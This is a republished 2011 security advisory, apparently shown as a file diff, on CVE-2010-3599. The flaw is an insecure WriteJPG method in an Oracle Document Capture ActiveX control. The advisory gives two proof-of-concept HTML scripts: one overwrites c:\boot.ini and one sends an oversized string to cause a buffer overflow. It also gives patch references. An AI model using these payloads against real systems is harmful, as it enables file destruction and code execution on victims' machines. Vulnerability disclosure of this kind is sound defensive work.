@@ -1,0 +1,133 @@
+Source:  http://packetstormsecurity.org/files/view/97871/DSECRG-11-006.txt
+
+ActiveX components contain insecure methods.
+
+Digital Security Research Group [DSecRG] Advisory DSECRG-11-006 (internal #DSECRG-09-066) 
+
+
+Application:                    Oracle Document Capture 
+Versions Affected:              Oracle Document Capture 10.1.3.5
+Vendor URL:                     http://oracle.com
+Bugs:                           Insecure method. Buffer overflow.
+Exploits:                       YES
+Reported:                       14.12.2009
+Vendor response:                15.12.2009
+Date of Public Advisory:        24.01.2011
+CVE:                            CVE-2010-3599
+Author:                         Alexandr Polyakov from DSecRG 
+
+Description
+***********
+
+Insecure method was founded in NCSECWLib ActiveX control component which is a part of  Oracle Document Capture .
+One of the methods (WriteJPG) can be used to overwrite files on users system and also affected to buffer overflow.
+
+
+
+
+Details
+*******
+
+Attacker can construct html page which call vulnerable function "WriteJPG" from ActiveX Object NCSECWLib.
+
+Example 1 (file overwrite)
+******* 
+
+
+<html>
+<script>
+targetFile = "C:\Program Files\Oracle\Document Capture\NCSEcw.dll"
+prototype  = "Sub WriteJPG ( ByVal OutputFile As String ,  ByVal Quality As Long ,  ByVal bWriteWorldFile As Boolean )"
+memberName = "WriteJPG"
+progid     = "NCSECWLib.NCSRenderer"
+argCount   = 3
+
+arg1="c:\boot.ini"
+arg2=1
+arg3=True
+
+target.WriteJPG arg1 ,arg2 ,arg3 
+
+</script>
+</html>
+
+
+Example 2
+*******
+
+<html>
+<script>
+targetFile = "C:\Program Files\Oracle\Document Capture\NCSEcw.dll"
+prototype  = "Sub WriteJPG ( ByVal OutputFile As String ,  ByVal Quality As Long ,  ByVal bWriteWorldFile As Boolean )"
+memberName = "WriteJPG"
+progid     = "NCSECWLib.NCSRenderer"
+argCount   = 3
+
+arg1=String(13332, "A")
+arg2=1
+arg3=True
+
+target.WriteJPG arg1 ,arg2 ,arg3 
+
+</script></job></package>
+
+
+References
+**********
+
+http://dsecrg.com/pages/vul/show.php?id=306
+http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html
+
+
+
+
+Fix Information
+*************
+
+Information was published in CPU Jan 2011.
+All customers can download CPU patches following instructions from: 
+
+http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html
+
+
+About
+*****
+
+Digital Security: 
+
+Is one of the leading IT security companies in CEMEA, providing information security consulting, audit and penetration testing services, ERP and SAP security assessment, certification for ISO/IEC 27001:2005 and PCI DSS and PA DSS standards.
+
+Digital Security Research Group:
+
+International subdivision of Digital Security company focused on research and software development for securing business-critical systems like: enterprise applications (ERP,CRM,SRM), technology systems (SCADA, Smart Grid) and banking software. DSecRG developed new product "ERPSCAN security suite for SAP NetWeaver" and service "ERPSCAN Online" which can help customers to perform automated security assessments and compliance checks for SAP solutions.
+
+
+Contact: research [at] dsecrg [dot] com
+http://www.dsecrg.com
+http://www.erpscan.com
+
+
+
+Polyakov Alexandr. PCI QSA,PA-QSA
+CTO Digital Security
+Head of DSecRG
+______________________
+DIGITAL SECURITY
+phone:  +7 812 703 1547
+        +7 812 430 9130
+e-mail: a.polyakov@dsec.ru  
+
+www.dsec.ru
+www.dsecrg.com www.dsecrg.ru
+www.erpscan.com www.erpscan.ru
+www.pcidssru.com www.pcidss.ru
+
+
+-----------------------------------
+This message and any attachment are confidential and may be privileged or otherwise protected 
+from disclosure. If you are not the intended recipient any use, distribution, copying or disclosure 
+is strictly prohibited. If you have received this message in error, please notify the sender immediately 
+either by telephone or by e-mail and delete this message and any attachment from your system. Correspondence 
+via e-mail is for information purposes only. Digital Security neither makes nor accepts legally binding 
+statements by e-mail unless otherwise agreed. 
+-----------------------------------
